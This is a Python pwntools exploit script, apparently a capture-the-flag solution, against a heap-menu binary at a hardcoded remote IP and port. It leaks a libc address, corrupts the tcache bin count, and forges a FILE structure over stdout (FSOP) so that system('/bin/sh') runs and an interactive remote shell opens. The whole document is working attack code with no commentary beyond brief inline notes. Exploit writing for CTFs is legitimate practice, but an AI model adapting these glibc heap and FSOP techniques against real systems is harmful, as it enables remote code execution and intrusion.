from pwn import *
import time

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")
#conn = process()
#conn = remote("localhost", 1337)
conn = remote("34.13.229.94", 1337)
#gdb.attach(conn)

def create(size, content):
    conn.sendline(b'1')
    conn.sendline(str(size).encode())
    conn.sendline(content)

def delete():
    conn.sendline(b'2')

def multiply(item):
    conn.sendline(b'3')
    conn.sendline(str(item).encode())

def exit_program():
    conn.sendline(b'4')

#import sys
#o = 0x1000 * int(sys.argv[1])
o = 0x1000 * -3 # offset in docker is different from local

create(0x100000, b"snailz")
multiply(0x3055b0 - o + 5*8)

conn.recvuntil(b"\0\0\0\0")
libc.address = u64(conn.recv(8)) - 0x205710
info("libc @ " + hex(libc.address))
multiply(0x3041d8 - o) # mp_.tcache_bins

# FSOP RCE
stdout_lock = libc.address + 0x205710   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
gadget = libc.address + 0x00000000001724f0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

create(0x40, b"asdf")
delete() # fill the tcache index
create(0x100, p64(libc.sym['_IO_2_1_stdout_'])) # make new tcache chunks
create(0x4d0, bytes(fake)) # get my chunk back


conn.interactive()
